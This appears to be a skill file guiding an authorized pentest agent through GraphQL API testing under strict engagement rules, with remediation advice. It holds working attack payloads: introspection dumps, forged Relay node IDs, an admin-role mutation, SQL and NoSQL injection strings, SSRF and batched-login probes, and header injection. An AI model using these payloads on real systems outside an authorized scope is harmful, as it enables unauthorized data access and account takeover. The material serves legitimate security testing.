---
name: web-graphql
description: "GraphQL API testing for a pentest-team engagement — endpoint discovery and engine fingerprinting, introspection abuse and blind schema reconstruction (field-suggestion oracle, clairvoyance/InQL), BOLA/BFLA via Relay node IDs and nested-object traversal, injection through arguments/variables/directives, batching and alias/depth abuse (probe, never DoS), and subscription/WebSocket auth. Load it when the appsec-triage API-testing (GraphQL) sweep turns up a GraphQL lead on a claimed web/API target."
---

# GraphQL API Testing — under the engagement protocol

Deep methodology for the GraphQL class. You reach here from the `appsec-triage` API-testing sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every request goes to a target you own on the board that is on the `ROE.md` allowlist — the single `/graphql` endpoint and its WebSocket path, nothing else the schema reveals.
- **Prove with a marker, not a dump.** A single node-ID substitution reaching a *planted* victim record, or a `__type`/suggestion read that shows the field exists, proves BOLA/BFLA — never enumerate every user or exfiltrate a table. No-real-data means the proof is a marker or a hash.
- **Read before write; destructive, RCE, or outward-facing routes to the anchor.** Injection escalation (UNION/OS command through a resolver), a mutation that mutates or deletes, and any SSRF/OOB are destructive or outward-facing — mark the surface blocked and route through the lead to the anchor for the human's go. An SSRF via a resolver URL argument is proven by reaching a **benign in-scope listener**, never a live `169.254.169.254` credential pull; a subscription/CSWSH proof exfiltrates to your own in-scope callback, never `attacker.com`.
- **Rate-limit and coordinate load.** Batching, alias fans, depth nesting, and clairvoyance wordlists can exhaust a shared server or trip a WAF ban for the whole team. Probe the *presence* of the flaw with a tiny batch; never run the amplification to actually degrade the service.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run.

## Quick workflow

1. Confirm the endpoint and fingerprint the engine.
2. Dump the schema via introspection; if blocked, reconstruct blind.
3. Map the attack surface (Voyager/InQL) — types, mutations, subscriptions.
4. Test authz on every query/mutation with no-token, low-priv, and cross-tenant tokens.
5. Probe injection in arguments/variables/directives (read-only confirmation).
6. Probe batching, depth, and subscription auth — presence only, do not DoS.
7. File the finding with a marker-based reproduction and remediation.

## Discovery and fingerprinting

```bash
curl -s -X POST https://<in-scope>/graphql \
  -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | jq .
```
Probe `/graphql`, `/graphiql`, `/v1/graphql`, `/api/graphql`, `/playground`. Some accept GET (a CSRF signal). Fingerprint the engine and run a one-pass config audit:
```bash
graphw00f -t https://<in-scope>/graphql          # engine → tailored payloads
graphql-cop -t https://<in-scope>/graphql        # introspection, suggestions, GET, batching
```

## Introspection and blind schema reconstruction

Full dump when enabled — the highest-value recon step, and read-only:
```graphql
query { __schema {
  queryType{name} mutationType{name} subscriptionType{name}
  types{ kind name fields(includeDeprecated:true){ name args{name type{...T}} type{...T} }
         inputFields{name type{...T}} enumValues{name} }
  directives{ name locations args{name type{...T}} } } }
fragment T on __Type{ kind name ofType{kind name ofType{kind name ofType{kind name}}} }
```
Pipe into GraphQL Voyager or load InQL in Burp to generate per-field queries. If `__schema` is blocked but `__type` is not (a common miss):
```graphql
query { __type(name:"User"){ name fields{ name type{name kind} } } }
```
**Field-suggestion oracle** — most engines answer an unknown field with "Did you mean…". Harvest names, and automate with clairvoyance (throttle the wordlist on a shared host):
```graphql
query { __typename aaa }   # → "Did you mean \"user\", \"admin\"?"
```
```bash
clairvoyance -t https://<in-scope>/graphql -w wordlist.txt -o schema.json
```
Also: Apollo Sandbox introspects client-side even when the prod toggle is off; grep client JS for `(query|mutation|fragment)\s+\w+` to recover operations.

## Authorization — BOLA / BFLA (prove with a marker)

Field-level checks are hand-written per resolver, so gaps are pervasive. Confirm against a **planted** second tenant, not real customers; stop at one record.

**IDOR via Relay node IDs** — the opaque ID is usually `base64("Type:numericID")`:
```bash
echo -n "VXNlcjoxMjM=" | base64 -d      # User:123
echo -n "User:124" | base64             # forge the marker tenant's id
```
```graphql
query { node(id:"<marker-id>"){ ... on User { id email role } } }
```
Substitute the id of a record you planted to prove the access break — do not loop `seq 1..N` across live users to "show scale".

**Nested-object gaps** — top-level filter that does not carry to a relationship:
```graphql
query { myOrders { id customer { id email paymentMethods { cardNumber } } } }
```
The `customer` resolver may load another user without an ownership check.

**BFLA / mutations** — replay state-changing mutations with no token, low-priv, and cross-tenant tokens; confirm the privilege break, then stop (do not actually promote or delete a real account):
```graphql
mutation { updateUser(id:"<marker-id>", input:{ role:"ADMIN" }){ id role } }
```
Cursor manipulation: decode the Relay cursor (often `base64("cursor:N")`) and rewind the offset to reach records from the start.

## Injection through resolvers (read-only confirmation)

Arguments and variables flow into resolvers. Confirm the vector; the destructive escalation is gated.
```graphql
query GetUser($name:String!){ user(name:$name){ id email } }
```
```json
{"name":"admin' OR 1=1 --"}                      // boolean confirm; hand SQLi off to web-sqli
{"filter":{"username":{"$ne":""}}}               // NoSQL operator injection
```
A time-based probe (`{"$where":"sleep(5000)"}`) confirms without extracting; keep the delay short and the count low. **SSRF via a URL argument** (webhook/avatar/import) is proven by pointing it at a **benign in-scope listener** and never at cloud metadata:
```graphql
mutation { setAvatar(url:"http://<in-scope-listener>/hit"){ success } }
```
Directive flooding (thousands of `@include`) crashes some parsers — this is availability-affecting; note reachability, do **not** fire the crashing payload without the human's go.

## Batching, depth, complexity — probe, do not DoS

Servers that accept operation arrays often rate-limit by HTTP request, not by operation — so a batch is a rate-limit bypass. Confirm the *bypass exists* with a small batch (e.g. 3–5 login/OTP attempts in one request, or alias batching `a1: login… a2: login…`); do not run a 10k-code OTP sweep or a real credential brute against a live account.
```json
[{"query":"mutation{ login(user:\"admin\",pass:\"p1\"){token} }"},
 {"query":"mutation{ login(user:\"admin\",pass:\"p2\"){token} }"}]
```
Depth bombs, alias amplification, and circular fragments are DoS — demonstrate that no depth/cost/alias limit is enforced with a bounded probe (e.g. a 3–4 level nest that returns), and report the missing control as the finding. Never run the amplifying version on a shared or production target.

## Subscriptions and WebSocket auth

```json
{"type":"connection_init","payload":{}}
{"id":"1","type":"subscribe","payload":{"query":"subscription{ newOrder{ id total } }"}}
```
Test: unauthenticated `connection_init`; a token that expires mid-connection but keeps streaming (auth checked only at handshake); and CSWSH where the socket trusts cookies without an Origin check — prove the last by exfiltrating one event to **your in-scope callback**, never an external host. Also worth a look: `{ _service { sdl } }` (Apollo Federation SDL leak) and `x-hasura-role: admin` header injection when the admin secret is unenforced (read a marker row only).

## Remediation (for the finding)

1. **Fix** — enforce ownership/authz in **every** resolver, not just top-level (schema directives `@auth`/`@hasRole`); parameterized queries in resolvers; disable introspection and field suggestions in production.
2. **Defense in depth** — query depth (7–10) and cost/complexity limits and batch-size caps (GraphQL Armor); rate-limit by operation count, not HTTP request; persisted-query allowlist; validate `connection_init` auth and re-validate tokens on long-lived subscriptions; enforce Origin and `Content-Type: application/json`.
3. **Detection** — log/SIEM rules on `__schema`/`__type` in query bodies, high alias/batch counts, and repeated suggestion errors; a WAF that parses the JSON `query` field, not just URL params.

Write it up in the `appsec-reporting` finding format, **CWE-639** (authorization bypass via user-controlled key) with **CWE-400** (uncontrolled resource consumption) for the batching/depth findings, and the OWASP API Security Top 10 mapping (API1 BOLA / API5 BFLA / API4 unrestricted resource consumption), with the marker-based reproduction.
